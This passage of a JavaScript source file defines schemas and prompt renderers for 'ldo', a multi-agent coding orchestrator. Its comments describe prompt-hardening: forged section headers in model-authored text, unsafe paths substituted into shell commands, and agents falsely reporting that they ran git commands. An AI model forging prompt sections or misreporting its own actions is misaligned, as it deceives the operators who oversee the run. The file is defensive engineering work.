export const meta = {
  name: 'ldo',
  description: 'Lightweight Dev Orchestrator: Plan→[Research→Plan]→[Security→]Code⇄Review, with a different model per role',
  whenToUse: 'args.task runs one feature in the current directory. args.tasks (an array) runs N independent features in parallel, each isolated in its own git worktree, created and verified in a dedicated Isolate phase before anything else runs; each ships separately afterward via /ldo-ship run from its own worktree. Add planOnly: true to either form to stop after Plan (and Security, when the surface is elevated) and get the plan plus its sizing block back without implementing it. args.resumePlan accepts a previously produced plan object and skips the Planner in a plain single-task run (not isolate: true, not args.tasks); an invalid object logs why and the Planner runs normally.',
  phases: [
    { title: 'Isolate', detail: 'Create and verify this feature\'s git worktree (isolated/multi-feature runs only)' },
    { title: 'Research', detail: 'Multi-source web research (automatic for unresolved surface requirements; also opt-in)' },
    { title: 'Plan', detail: 'Read the codebase, plan the change, rate complexity + security surface' },
    { title: 'Security', detail: 'Threat-model the plan before code exists (elevated surface only)' },
    { title: 'Code', detail: 'Set up env, implement, test, document' },
    { title: 'Review', detail: 'Read the diff, drive the app, prove the criteria' },
    { title: 'Record', detail: 'Persist the review report, architecture doc, backlog (approved medium+ only)' },
  ],
}

// ═══════════════════════════════════════════
// SCHEMAS
// ═══════════════════════════════════════════

const PLAN_SCHEMA = {
  type: 'object',
  properties: {
    complexity: { type: 'string', enum: ['trivial', 'medium', 'complex'] },
    security_surface: {
      type: 'string',
      enum: ['none', 'low', 'elevated'],
    },
    security_notes: { type: 'array', items: { type: 'string' } },
    summary: { type: 'string' },
    surface_analysis: {
      type: 'object',
      properties: {
        project_type: { type: 'string' },
        surfaces: {
          type: 'array', minItems: 1, maxItems: 20,
          items: {
            type: 'object',
            properties: {
              id: { type: 'string' }, name: { type: 'string' }, change: { type: 'string' },
              contracts: { type: 'array', maxItems: 10, items: { type: 'string' } },
              principles: { type: 'array', maxItems: 10, items: { type: 'string' } },
              coverage: { type: 'string', enum: ['covered', 'not_applicable', 'research_required', 'contract_candidate', 'resolved'] },
              evidence: { type: 'array', minItems: 1, maxItems: 10, items: { type: 'string' } }, resolution: { type: 'string' },
            },
            required: ['id', 'name', 'change', 'contracts', 'principles', 'coverage', 'evidence', 'resolution'],
          },
        },
      },
      required: ['project_type', 'surfaces'],
    },
    codebase_context: {
      type: 'object',
      properties: {
        stack: { type: 'string' },
        conventions: { type: 'string' },
        relevant_files: {
          type: 'array',
          items: {
            type: 'object',
            properties: {
              path: { type: 'string' },
              role: { type: 'string', enum: ['primary', 'dependent', 'test', 'config'] },
              note: { type: 'string' },
            },
            required: ['path', 'role'],
          },
        },
        test_command: { type: 'string' },
        test_command_scoped: { type: 'string' },
        run_command: { type: 'string' },
      },
      required: ['stack', 'relevant_files'],
    },
    steps: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          what: { type: 'string' },
          files: { type: 'array', items: { type: 'string' } },
          acceptance: { type: 'string' },
          user_facing: { type: 'boolean' },
        },
        required: ['what', 'files', 'acceptance'],
      },
    },
    problem_evidence: {
      type: 'object',
      properties: {
        basis: {
          type: 'string',
          enum: ['measured', 'reported', 'inspected', 'asserted'],
        },
        evidence: { type: 'string' },
        confirms: { type: 'string' },
      },
      required: ['basis'],
    },
    risks: { type: 'array', items: { type: 'string' } },
    // Deliberately bare. Every other field here earns a `description`; this one
    // cannot afford 94 chars of it — PLAN_SCHEMA measured 3258 against the 3400
    // classifier ceiling scripts/check-schema-size.sh holds, and the same field
    // carrying a one-line description measures 3407. The prose that would live
    // here is agents/planner.md section 1.6 instead, where it costs nothing.
    conflicts: { type: 'array', items: { type: 'string' } },
    rollback_plan: { type: 'string' },
    worktree_path: { type: 'string', description: 'Multi-feature mode only: the worktree path you worked in' },
    branch: { type: 'string', description: 'Multi-feature mode only: the branch you worked on' },
    migrations: {
      type: 'object',
      properties: {
        count: { type: 'number' },
        directory: { type: 'string' },
        identifiers: { type: 'array', items: { type: 'string' } },
        note: { type: 'string' },
      },
      required: ['count', 'directory'],
    },
    sizing: {
      type: 'object',
      properties: {
        fits_one_run: { type: 'boolean' },
        reason: { type: 'string' },
        suggested_split: {
          type: 'array',
          items: {
            type: 'object',
            properties: {
              label: { type: 'string' },
              task: { type: 'string' },
              depends_on: { type: 'array', items: { type: 'string' } },
            },
            required: ['label', 'task'],
          },
        },
      },
      required: ['fits_one_run'],
    },
  },
  // sizing is deliberately absent from `required`: a schema-validation failure
  // aborts the Planner outright, and an advisory field that can kill a run
  // contradicts the whole point of it being advisory. A Planner that omits it
  // produces a run with no size rating, which phasePlan warns about.
  required: ['complexity', 'summary', 'surface_analysis', 'steps', 'codebase_context'],
}

const CODER_SCHEMA = {
  type: 'object',
  properties: {
    files_changed: { type: 'array', items: { type: 'string' } },
    issue_outcomes: {
      type: 'array',
      maxItems: 30,
      description: 'Fix passes only: one entry per issue you were sent',
      items: {
        type: 'object',
        properties: {
          file: { type: 'string' },
          issue: { type: 'string', description: "The Reviewer's `what` text, verbatim" },
          outcome: { type: 'string', enum: ['fixed', 'not_fixed', 'blocked'] },
          detail: { type: 'string', description: 'Why, when it is not fixed' },
        },
        required: ['file', 'issue', 'outcome'],
      },
    },
    summary: { type: 'string' },
    tests: {
      type: 'object',
      properties: {
        written: { type: 'array', items: { type: 'string' } },
        updated: { type: 'array', items: { type: 'string' } },
        result: { type: 'string', description: 'e.g. "42 passed, 0 failed"' },
        scope: { type: 'string', enum: ['scoped', 'full'] },
        full_suite: {
          type: 'object',
          properties: {
            ran: { type: 'boolean' },
            command: { type: 'string' },
            result: { type: 'string' },
          },
        },
        pre_existing_failures: { type: 'array', items: { type: 'string' }, description: 'Exactly the entries in tests.baseline.failing that still fail at the end — not recollection' },
        baseline: {
          type: 'object',
          description: 'The suite\'s state before any edit, captured up front so pre_existing_failures is evidence, not memory',
          properties: {
            captured: { type: 'boolean' },
            command: { type: 'string' },
            result: { type: 'string', description: 'e.g. "39 passed, 3 failed" as of before any edit' },
            failing: { type: 'array', items: { type: 'string' } },
            note: { type: 'string', description: 'Why it could not be captured, if it could not' },
          },
        },
      },
    },
    env: {
      type: 'object',
      properties: {
        actions: { type: 'array', items: { type: 'string' } },
        unresolved: { type: 'array', items: { type: 'string' } },
      },
    },
    docs_updated: { type: 'array', items: { type: 'string' } },
    deviations: { type: 'array', items: { type: 'string' } },
  },
  required: ['files_changed', 'summary'],
}

const VERDICT_SCHEMA = {
  type: 'object',
  properties: {
    status: { type: 'string', enum: ['approved', 'changes_requested'] },
    summary: { type: 'string' },
    worktree_root: { type: 'string', description: 'Verbatim output of `git rev-parse --show-toplevel` from where you reviewed — the revert-and-restore proof rewrites files, so this must be confirmed before that step runs' },
    migrations_check: {
      type: 'object',
      description: 'Only when the plan declares a migrations block',
      properties: {
        status: { type: 'string', enum: ['ok', 'mismatch', 'collision', 'not_applicable'] },
        declared: { type: 'number' },
        created: { type: 'array', items: { type: 'string' } },
        collisions: { type: 'array', items: { type: 'string' } },
        evidence: { type: 'string' },
      },
    },
    issues: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          file: { type: 'string' },
          severity: { type: 'string', enum: ['critical', 'major', 'minor', 'nit'] },
          what: { type: 'string' },
          suggestion: { type: 'string', description: 'A hypothesis the Coder verifies against the code, not a step to apply — say what you actually checked' },
          introduced_by_fix: { type: 'boolean', description: 'True only when this defect is a consequence of the fix just made — code the Coder wrote or changed in this pass. Leave it off for anything pre-existing.' },
        },
        required: ['file', 'severity', 'what', 'suggestion'],
      },
    },
    verification: {
      type: 'object',
      properties: {
        verdict: { type: 'string', enum: ['verified', 'partial', 'failed', 'nothing_to_drive'] },
        criteria: {
          type: 'array',
          items: {
            type: 'object',
            properties: {
              criterion: { type: 'string' },
              status: { type: 'string', enum: ['passed', 'failed', 'skipped'] },
              evidence: { type: 'string' },
              note: { type: 'string' },
            },
            required: ['criterion', 'status', 'evidence'],
          },
        },
        blockers: { type: 'array', items: { type: 'string' } },
      },
    },
    attacks: {
      type: 'array',
      description: 'What the Reviewer actively tried to break, and whether it held',
      items: {
        type: 'object',
        properties: {
          vector: { type: 'string', description: 'The input or condition tried' },
          outcome: { type: 'string', enum: ['broke', 'held'] },
          evidence: { type: 'string', description: 'Command and captured output' },
        },
        required: ['vector', 'outcome'],
      },
    },
  },
  required: ['status', 'summary'],
}

const RECORD_SCHEMA = {
  type: 'object',
  properties: {
    worktree_root: { type: 'string', description: 'Verbatim output of `git rev-parse --show-toplevel` from where you wrote' },
    files_written: { type: 'array', items: { type: 'string' }, description: 'Paths relative to worktree_root' },
    backlog: {
      type: 'object',
      properties: {
        destination: { type: 'string', enum: ['file', 'github', 'none'], description: 'Where items actually went — must match the BACKLOG DESTINATION block in the prompt; "none" means there were no backlog items' },
        file: { type: 'string' },
        count: { type: 'number' },
      },
    },
    notes: { type: 'string' },
  },
  required: ['worktree_root', 'files_written'],
}

const SECURITY_SCHEMA = {
  type: 'object',
  properties: {
    status: { type: 'string', enum: ['clean', 'findings'] },
    summary: { type: 'string' },
    findings: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          severity: { type: 'string', enum: ['critical', 'high', 'medium', 'low', 'info'] },
          category: { type: 'string', enum: ['injection', 'auth', 'data_exposure', 'input_validation', 'ssrf', 'supply_chain', 'crypto', 'race_condition', 'resource', 'config'] },
          plan_step: { type: 'string' },
          what: { type: 'string' },
          exploit_scenario: { type: 'string' },
          mitigation: { type: 'string' },
          cwe: { type: 'string' },
        },
        required: ['severity', 'category', 'what', 'exploit_scenario', 'mitigation'],
      },
    },
    threat_model_notes: { type: 'string' },
  },
  required: ['status', 'summary'],
}

const RESEARCH_SCHEMA = {
  type: 'object',
  properties: {
    question: { type: 'string' },
    summary: { type: 'string' },
    findings: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          claim: { type: 'string' },
          confidence: { type: 'string', enum: ['high', 'medium', 'low'] },
          sources: { type: 'array', items: { type: 'string' } },
          contradictions: { type: 'string' },
        },
        required: ['claim', 'confidence', 'sources'],
      },
    },
    recommendations: { type: 'array', items: { type: 'string' } },
    contract_candidates: {
      type: 'array',
      maxItems: 20,
      items: {
        type: 'object',
        properties: {
          surface_id: { type: 'string' }, kind: { type: 'string', enum: ['scope', 'accepted_risk', 'security_floor', 'code', 'area'] },
          target: { type: 'string' }, rule: { type: 'string' }, evidence: { type: 'array', items: { type: 'string' } },
        },
        required: ['surface_id', 'kind', 'target', 'rule', 'evidence'],
      },
    },
    gaps: { type: 'array', items: { type: 'string' } },
  },
  required: ['question', 'summary', 'findings', 'recommendations', 'contract_candidates', 'gaps'],
}

// The Isolate phase asks for four independent git outputs rather than a
// "yes I created it" flag, because the failure this phase exists to catch is an
// agent that never ran `git worktree add` and reported the commands from where
// it already stood — a claim field would have been true-shaped in exactly that
// run. base_head is read in the main checkout BEFORE the add, head_sha inside
// the new tree after it; the pair is what distinguishes a branch created fresh
// with -b from one that was adopted.
const ISOLATION_SCHEMA = {
  type: 'object',
  properties: {
    worktree_path: { type: 'string', description: 'Relative path created, under .worktrees/' },
    branch: { type: 'string', description: 'Branch created with -b' },
    main_root: { type: 'string', description: 'git rev-parse --show-toplevel, from the main checkout' },
    base_head: { type: 'string', description: 'git rev-parse HEAD in the main checkout, before the add' },
    toplevel: { type: 'string', description: 'git rev-parse --show-toplevel, from INSIDE the worktree' },
    git_dir: { type: 'string', description: 'git rev-parse --absolute-git-dir, from INSIDE' },
    head_branch: { type: 'string', description: 'git symbolic-ref --short HEAD, from INSIDE' },
    head_sha: { type: 'string', description: 'git rev-parse HEAD, from INSIDE' },
    worktree_list: { type: 'string', description: 'git worktree list --porcelain, verbatim' },
    notes: { type: 'string', description: 'Collisions hit, suffix used' },
  },
  required: ['worktree_path', 'branch', 'main_root', 'base_head', 'toplevel', 'git_dir', 'head_branch', 'head_sha', 'worktree_list'],
}

// ═══════════════════════════════════════════
// RENDERING
// ═══════════════════════════════════════════

// The Planner's codebase_context becomes the shared cache prefix. Anthropic keys
// the prompt cache on (model_id + prefix_bytes): Coder and Reviewer on the same
// model both hit it. A different reviewer model means a separate namespace and
// one cold start — usually worth it for the independent read.
function renderContext(ctx) {
  if (!ctx) return ''
  const parts = ['## PROJECT CONTEXT']
  if (ctx.stack) parts.push('### Stack\n' + ctx.stack)
  if (ctx.conventions) parts.push('### Conventions\n' + ctx.conventions)
  if (ctx.relevant_files?.length) {
    parts.push('### Files\n' + ctx.relevant_files
      .map(f => `- \`${f.path}\` (${f.role})${f.note ? ` — ${f.note}` : ''}`)
      .join('\n'))
  }
  const cmds = []
  if (ctx.test_command) cmds.push(`- test: \`${ctx.test_command}\``)
  if (ctx.test_command_scoped) cmds.push(`- test (scoped): \`${ctx.test_command_scoped}\``)
  if (ctx.run_command) cmds.push(`- run: \`${ctx.run_command}\``)
  if (cmds.length) parts.push('### Commands\n' + cmds.join('\n'))
  return parts.join('\n') + '\n\n'
}

// The three fields on a plan whose entire purpose is to be executed.
const RECOVERED_COMMAND_FIELDS = ['test_command', 'test_command_scoped', 'run_command']

// A live Planner call derives these by reading the codebase; a recovered plan's
// copy cannot be re-verified against anything, so they are deleted rather than
// nulled — nothing downstream can re-trust what is not there.
// Unconditional over all three rather than guarded on any one being present: a
// guard keyed on sibling fields lets a recovered plan carrying ONLY
// test_command_scoped skip the strip entirely, and that template is rendered
// into both the Coder and the Reviewer prompt for execution.
// Returns what it removed, so the caller can log it AND tell the two agents
// what they now have to rediscover. Returning nothing was the whole defect:
// agents/coder.md already tells the Coder to find its own test command, but
// run_command is what the REVIEWER drives the app with, and nothing told it
// anything — so a resumed run verified materially less than the run it claimed
// to continue, and the only notice was one log line nobody downstream reads.
function stripRecoveredCommands(planFromResume, plan) {
  if (!planFromResume || !plan?.codebase_context) return []
  const dropped = RECOVERED_COMMAND_FIELDS.filter(f => plan.codebase_context[f] !== undefined)
  dropped.forEach(f => delete plan.codebase_context[f])
  return dropped
}

// Empty string for an empty list — the same discipline renderDesignDrift uses —
// so a run that was not resumed pays no prompt block at all and its Coder,
// Reviewer and Security prompts stay byte-identical to what they were.
// Built from FIELD NAMES and fixed text only, never from the dropped values:
// rendering the command back into a prompt would hand an executing agent
// exactly the string the strip exists to keep away from a Bash tool.
// The evidence requirement is the audit half. Telling the Reviewer to
// rediscover a run command trades one unverified command for another sourced
// the same way the Coder's is — a trade this project already accepts — but a
// rediscovered command nobody wrote down leaves a resumed run's verification
// uncomparable to the run it claims to continue, which is the gap this block
// exists to close.
function renderRecoveredCommands(dropped) {
  const fields = (Array.isArray(dropped) ? dropped : []).filter(f => RECOVERED_COMMAND_FIELDS.includes(f))
  if (!fields.length) return ''
  return [
    '## RECOVERED PLAN — COMMANDS NOT CARRIED OVER',
    `This plan was recovered from an interrupted run. ${fields.join(', ')} ${fields.length === 1 ? 'was' : 'were'} dropped from its context on the way in: a command string from a dead run cannot be re-verified against anything, and the one thing these fields are for is being executed, so none of them may reach a Bash tool on the strength of a file.`,
    'CODER: rediscover the test command from the project itself, as your agent definition already requires — package.json scripts, the Makefile, tox/nox, the CI workflow, the README.',
    'REVIEWER: rediscover the run command the same way, from the same places, BEFORE reporting a criterion `skipped` or a verdict of `nothing_to_drive` for want of one. Name the command you used and where you found it in the `evidence` of every criterion it drove. If there genuinely is none, say that in the `evidence` too, naming what you checked — a resumed run that verifies less than the run it continues has to say so where the operator reads the result, not only in a log line.',
    '',
    '',
  ].join('\n')
}

// Every path substituted into a scoped command is filtered HERE, in code,
// before it reaches a prompt — never by a prose rule telling an agent to skip
// odd characters, because the strings come from the same class of component
// the rule would be addressed to (the plan's steps[].files, and the Coder's
// own tests.written/updated JSON, neither of which is pattern-constrained by
// its schema). A leading `-` makes a path an option rather than a target, and
// a `..` segment or a leading `/` points the runner outside the tree — both
// pass the character class.
//
// The rules themselves live in safeRelPathSegments, with safeMigrationsDir, so
// there is one implementation rather than two that drift. The one deliberate
// divergence is allowDotPrefix: a segment here may begin with a dot, because
// test trees legitimately live under `.cache`, `.pytest_cache` or `.tox` and
// rejecting those would shrink a scoped selection to nothing on a project that
// uses them. `.` and `..` as whole segments stay rejected — the exception is
// about hidden directories, not about traversal. The empty segment (`a//b`)
// and the trailing slash were NOT deliberate: they were drift from an
// independent second copy of these rules, and delegating closes them.
//
// The trim stays here rather than in the shared core. It is existing behaviour
// on model-supplied test paths, while safeMigrationsDir and safeWorktreePath
// have always rejected a whitespace-padded value outright — SAFE_REL_PATH has
// no space in its class — and trimming in the core would widen the stricter of
// the two callers, which is the direction a validator must never move by
// accident.
function safeTestPath(p) {
  return safeRelPathSegments(typeof p === 'string' ? p.trim() : p, { allowDotPrefix: true })
}

// Returns the safe paths and the rejected ones separately: a silently shorter
// list means files the pass believed it tested and did not, which is the
// docs/contracts/code.md "never swallow an error silently" rule applied to a
// filter rather than to a catch. Every caller logs `dropped`.
// What goes into `safe` is safeTestPath's NORMALIZED return, not the string it
// was given: validating `a/b/` and then substituting `a/b/` is how a path that
// passed a check reaches a command in a spelling nothing checked. The de-dup
// keys on that same normalized form, so `a/b` and `a/b/` cannot both be
// substituted as two selections of one file.
// `dropped` keeps the raw trimmed string, because that is what the caller has
// to show the operator to be recognisable.
function partitionTestPaths(paths) {
  const seen = new Set()
  const safe = []
  const dropped = []
  for (const p of paths || []) {
    // A non-string is dropped, never coerced. `String(null)` is `'null'`, a
    // perfectly well-formed relative path that safeTestPath accepts and
    // substituteScopedPaths then quotes into a real command — so a malformed
    // model reply became `pytest 'null' 'undefined' '42'`, a run testing three
    // files that do not exist and reporting whatever that returns. The typed
    // rejection one level down (safeRelPathSegments) exists for exactly this,
    // and the coercion here was defeating it. Both schemas that feed this
    // declare string arrays, so the only way in is a reply that ignored them.
    if (typeof p !== 'string') { dropped.push(String(p)); continue }
    const s = p.trim()
    const normalized = safeTestPath(s)
    // A rejected path has no normalized form, so it de-dups on the raw spelling
    // — the same one `dropped` shows, so that list does not repeat either.
    const key = normalized ?? s
    if (seen.has(key)) continue
    seen.add(key)
    if (normalized) safe.push(normalized)
    else dropped.push(s)
  }
  return { safe, dropped }
}

// Single quotes are sound only because safeTestPath already excluded `'` along
// with every other metacharacter; they are belt-and-braces against a path with
// a space, which the class also excludes.
function substituteScopedPaths(template, paths) {
  return template.replace('{paths}', paths.map(p => `'${p}'`).join(' '))
}

// The scoped-run instructions for the Coder and the Reviewer. Returns the
// effective mode alongside the block rather than just a string, because three
// separate conditions demote a run to the full suite and the caller has to log
// which one applied: the operator asked for `full`, the Planner supplied no
// usable template, or every path the plan names failed safeTestPath. That last
// one matters most — with an empty list `{paths}` substitutes to nothing, and
// `pytest` with no arguments runs everything (harmless) while `go test` runs
// only the current package and `cargo test -p` is a no-op, i.e. a near-zero
// test selection reporting green.
function renderScopedTests(plan, scopeSetting) {
  const template = plan?.codebase_context?.test_command_scoped
  if (scopeSetting !== 'scoped') return { block: '', mode: 'full', reason: `config.tests.scope is '${scopeSetting}'`, dropped: [] }
  if (!template) return { block: '', mode: 'full', reason: 'the plan carries no usable test_command_scoped', dropped: [] }

  const { safe, dropped } = partitionTestPaths((plan.steps || []).flatMap(s => s.files || []))
  if (!safe.length) {
    return { block: '', mode: 'full', reason: 'no file the plan names is safe to substitute into a shell command', dropped }
  }

  const droppedNote = dropped.length
    ? `\n\nNOT COVERED by the pre-rendered command: ${dropped.join(', ')} — ${dropped.length} path(s) the plan names cannot be substituted safely. Widen the scope by hand, or run the full suite, before you call those files tested.`
    : ''

  return {
    mode: 'scoped',
    dropped,
    block: `### Scoped test runs
This project's tests are scoped by default: run the subset that covers what you touched instead of the whole suite on every step. The template, exactly as validated:

\`${template}\`

Substitute the single \`{paths}\` with a space-separated list of single-quoted paths. Never substitute a path containing anything outside \`[A-Za-z0-9._/-]\`, or one starting with \`-\` or \`/\` — skip it and say so rather than quoting around it. Change nothing else about the command.

Already rendered for the files this plan names, safe to run as-is:

\`${substituteScopedPaths(template, safe)}\`${droppedNote}\n\n`,
  }
}

function renderPlan(plan) {
  const lines = [`## PLAN (${plan.complexity})`, plan.summary, renderSurfaceAnalysis(plan), '', '### Steps']
  plan.steps.forEach((s, i) => {
    lines.push(`${i + 1}. ${s.what}`)
    lines.push(`   Files: ${s.files.join(', ')}`)
    lines.push(`   Accept: ${s.acceptance}`)
  })
  const pe = plan.problem_evidence
  if (pe?.basis) {
    lines.push('', '### Why we believe this problem is real')
    lines.push(pe.basis === 'asserted'
      ? 'UNVERIFIED — the task asserts this problem; nothing observed confirms it. Treat the premise as unproven, not as established fact.'
      : `${pe.basis}${pe.evidence ? ` — ${pe.evidence}` : ''}`)
    if (pe.confirms) lines.push(`Confirmed by: ${pe.confirms}`)
  }
  if (plan.risks?.length) {
    lines.push('', '### Risks')
    plan.risks.forEach(r => lines.push(`- ${r}`))
  }
  const conflicts = renderConflicts(plan)
  if (conflicts) lines.push(conflicts)
  if (plan.rollback_plan) lines.push('', '### Rollback', plan.rollback_plan)
  const migrations = renderMigrations(plan)
  if (migrations) lines.push(migrations)
  return lines.join('\n')
}

function renderSurfaceAnalysis(plan) {
  const analysis = plan?.surface_analysis
  if (!analysis?.surfaces?.length) return '\n### Surface-to-contract matrix\nMISSING — approval is forbidden.'
  const lines = ['', `### Surface-to-contract matrix (${analysis.project_type})`]
  analysis.surfaces.forEach(surface => {
    lines.push(`- [${surface.coverage}] ${surface.id}: ${surface.name} — ${surface.change}`)
    if (surface.contracts?.length) lines.push(`  Contracts: ${surface.contracts.join('; ')}`)
    if (surface.principles?.length) lines.push(`  Principles: ${surface.principles.join('; ')}`)
    lines.push(`  Evidence: ${(surface.evidence || []).join('; ') || 'MISSING'}`)
    if (surface.resolution) lines.push(`  Resolution: ${surface.resolution}`)
  })
  return lines.join('\n')
}

// A conflict is a decision nobody has made yet, so the block says so in its
// heading and never reads as a resolved instruction. Rendered into renderPlan
// (Security, first Coder, first Review) AND renderConstraints (both fix passes)
// because issue #19's contradiction survived exactly as long as nothing
// downstream was told one existed.
// Capped and collapsed for the same reason risks are, and the reasoning above
// renderConstraints applies here word for word: `conflicts` is model-authored
// text quoted out of a host project's own files, so an entry opening `## ISSUES`
// would forge a section header in two agents' prompts, and an uncapped block is
// re-sent on every fix round up to MAX_FIX_LOOPS.
function renderConflicts(plan) {
  const conflicts = (Array.isArray(plan?.conflicts) ? plan.conflicts : []).filter(c => String(c ?? '').trim())
  if (!conflicts.length) return ''
  const truncated = conflicts.filter(c => String(c ?? '').length > PROMPT_TEXT_MAX).length
  const dropped = Math.max(0, conflicts.length - RENDER_LIST_MAX)
  if (truncated || dropped) log(`⚠ Plan conflicts trimmed for the prompts: ${truncated} entry(ies) over ${PROMPT_TEXT_MAX} chars truncated, ${dropped} beyond the first ${RENDER_LIST_MAX} dropped. A conflict entry is meant to fit ${PROMPT_TEXT_MAX} chars — see agents/planner.md section 1.6.`)
  return [
    '',
    '### Conflicts to confirm (unresolved — the operator has not chosen)',
    ...capList(conflicts.map(c => `- ${collapseLines(c)}`)),
    'These are decisions nobody has confirmed. Implement the side the plan\'s steps name, never a different one, and never quietly drop the disputed element. If no step says which side it plans from, say so in `deviations` rather than choosing for yourself.',
  ].join('\n')
}

// Separate from renderPlan because the fix-pass prompts send the compact plan,
// and a Reviewer without this block reports `not_applicable` — which
// enforceMigrationGate then converts into an issue no Coder edit can clear.
// plan.migrations.directory is validated (and deleted if unsafe) once, in
// phasePlan, before this function ever runs — never re-trust the raw string here.
function renderMigrations(plan) {
  // The NORMALIZED return is what gets rendered, not the raw field: validating
  // one spelling and then rendering another is the same validate-this-use-that
  // gap partitionTestPaths closes on the test-path side.
  const directory = safeMigrationsDir(plan?.migrations?.directory)
  if (!(plan?.migrations?.count > 0) || !directory) return ''
  return [
    '',
    '### Migrations (numbering is a hard constraint)',
    `Directory: ${directory}`,
    `Count: ${plan.migrations.count}`,
    `Identifiers: ${(plan.migrations.identifiers || []).join(', ') || '(none listed)'}`,
    'Create exactly these. If you find you need a number that is not on this list, stop and say so in `deviations` — do not take the next free one. In a parallel run another feature already owns it, and two migrations with the same number have undefined apply order.',
  ].join('\n')
}

// renderPlanCompact deliberately carries only `what`/`files` because a fix
// pass is narrow, but agents/planner.md:30 tells the Planner to carry project
// contracts verbatim into `risks` or a step's `acceptance` — so the compact
// renderer dropped exactly the text agents/reviewer.md:142 makes an
// always-`critical` blocking check, letting a fix pass manufacture a contract
// violation the Coder cannot see the rule for. Separate from renderPlan for
// the same reason renderMigrations is: the fix passes must not pay for the
// full plan.
//
// The risks block is the one place in the pipeline where a host project's own
// file text is re-sent on a schedule: the Planner copies contract entries into
// `risks` verbatim, and this block is quoted into BOTH the Coder fix prompt and
// the Reviewer fix prompt, on every pass, up to MAX_FIX_LOOPS. Field report #4
// measured a host contracts directory at 94 KB across five files, one of them
// 59 KB, against a documented per-entry limit of 200 characters (see
// /ldo-contract) that nothing measures — so a single non-compliant entry is
// paid for six times over.
// Capped per line AND per block because those are different shapes and either
// cap alone leaves the other open: one 59 KB line survives any list cap, and
// forty compliant lines survive any length cap. A compliant entry is at or
// under PROMPT_TEXT_MAX and passes through byte-identical, so the cap is only
// ever visible on an entry that already broke the documented rule — and it is
// visible, by marker and by log line, rather than silently shortened.
// collapseLines is doing a second job here beyond length: `risks` is
// model-authored text that came out of a file in someone else's repo, so an
// entry beginning `## ISSUES` or carrying a `\r` would otherwise forge a
// section header in two agents' prompts.
// The acceptance block above is deliberately NOT capped: a dropped criterion
// silently weakens the gate that block exists to hold, and steps are already
// soft-capped upstream.
function renderConstraints(plan) {
  const lines = []
  const withAcceptance = (plan.steps || []).filter(s => s.acceptance)
  if (withAcceptance.length) {
    lines.push('', '### Acceptance criteria (from the plan — unchanged by a fix pass)')
    withAcceptance.forEach((s, i) => lines.push(`${i + 1}. ${s.what} — ${s.acceptance}`))
  }
  // Before the risks block and capped separately, not merged into it: a plan
  // carrying more than RENDER_LIST_MAX risks would otherwise push the one
  // unresolved decision in the run out past the cap.
  const conflicts = renderConflicts(plan)
  if (conflicts) lines.push(conflicts)
  const risks = plan.risks?.length ? plan.risks : []
  if (risks.length) {
    const truncated = risks.filter(r => String(r ?? '').length > PROMPT_TEXT_MAX).length
    const dropped = Math.max(0, risks.length - RENDER_LIST_MAX)
    // The host-side signal. scripts/check-contracts.sh measures this repo's own
    // contracts, but the workflow has no filesystem access and cannot audit the
    // host project's — this line is the only place an operator learns that
    // their contract entries are over the limit they were told to write to.
    if (truncated || dropped) log(`⚠ Plan risks trimmed for the fix-pass prompts: ${truncated} entry(ies) over ${PROMPT_TEXT_MAX} chars truncated, ${dropped} beyond the first ${RENDER_LIST_MAX} dropped. Contract entries are meant to fit ${PROMPT_TEXT_MAX} chars — see /ldo-contract.`)
    lines.push('', '### Risks and project contracts (verbatim from the plan)')
    capList(risks.map(r => `- ${collapseLines(r)}`)).forEach(l => lines.push(l))
  }
  return lines.join('\n')
}

// ── project-knowledge signals ───────────────
//
// Two facts a run learns about a project that nothing used to carry back out.
//
// (1) The Planner is the only party that ever reads a host project's
// `docs/contracts/` — the workflow has no filesystem access — so an entry too
// long to carry verbatim is a fact only it can report, and it had nowhere to
// report it. Issue #20 measured a real contracts directory: 66 of 75 entries
// over the documented 200-character limit, longest 6407, so 88% of an enforced
// security floor reached the Coder compressed with nobody told. agents/planner.md
// section 1.5 prescribes the `CONTRACT OVER LIMIT:` prefix; this reads it back.
//
// (2) security_notes are COUNTED here and deliberately not capped. renderSecurity
// is the only path by which a Planner's own notes reach the Coder when the
// Security agent did not run, so a cap there would lose floor text that today
// arrives whole. Measure and say so; never trim.
//
// Everything returned is collapsed and capped for the reason renderConstraints
// does it: `risks` is text that came out of a file in someone else's repo, and
// an entry beginning `## ISSUES` forges a section header both in a log the
// operator reads as orchestrator output and in the Record prompt below.
const CONTRACT_LIMIT_PREFIX = 'CONTRACT OVER LIMIT:'
const CONTRACT_CANDIDATE_PREFIX = 'CONTRACT CANDIDATE:'

function contractWarnings(plan) {
  const risks = Array.isArray(plan?.risks) ? plan.risks : []
  const out = risks
    .map(r => String(r ?? '').trim())
    .filter(r => r.startsWith(CONTRACT_LIMIT_PREFIX))
    .map(r => collapseLines(r))
  const notes = Array.isArray(plan?.security_notes) ? plan.security_notes : []
  const overLong = notes.filter(n => String(n ?? '').length > PROMPT_TEXT_MAX).length
  if (overLong) out.push(`${overLong} security_notes entry(ies) exceed PROMPT_TEXT_MAX (${PROMPT_TEXT_MAX} chars) — they are rendered whole, but an entry this long was compressed by the Planner before it got here. See /ldo-contract for the split that fixes it.`)
  return capList(out)
}

// A project-wide rule the run had to settle because nothing in docs/contracts/
// settled it. Proposed by the Coder in `deviations` and by the Reviewer in
// `summary` — fields both already fill, because neither schema has room for
// another and a prefix costs nothing. The summary is split through
// LINE_BREAK_RUN rather than on `\n`, so a `\r`-separated line is still found.
function collectContractCandidates(coderResult, verdict) {
  const deviations = Array.isArray(coderResult?.deviations) ? coderResult.deviations : []
  const summaryLines = String(verdict?.summary ?? '').replace(LINE_BREAK_RUN, '\n').split('\n')
  const out = [...deviations.map(d => String(d ?? '')), ...summaryLines]
    .map(x => x.trim())
    .filter(x => x.startsWith(CONTRACT_CANDIDATE_PREFIX))
    .map(x => collapseLines(x))
  return capList(out)
}

function renderContractCandidates(candidates) {
  if (!candidates.length) return ''
  return '\n\n## CONTRACT CANDIDATES (propose only — never write a contract file)\n'
    + candidates.map(c => `- ${c}`).join('\n')
    + '\nWrite each as its own backlog item suggesting `/ldo-contract`, naming the file it would belong in. Do NOT create or edit anything under `docs/contracts/`: a contract is the operator\'s decision and this run only noticed the gap. State each rule in the abstract — never quote a credential, token, endpoint or customer identifier into a backlog item.'
}

// The single call site of both signals, kept pure and logging nothing so a gate
// can drive it: they used to be collected inside phaseRecord BELOW its early
// return, which made both inert on every `trivial` run and every ordinary
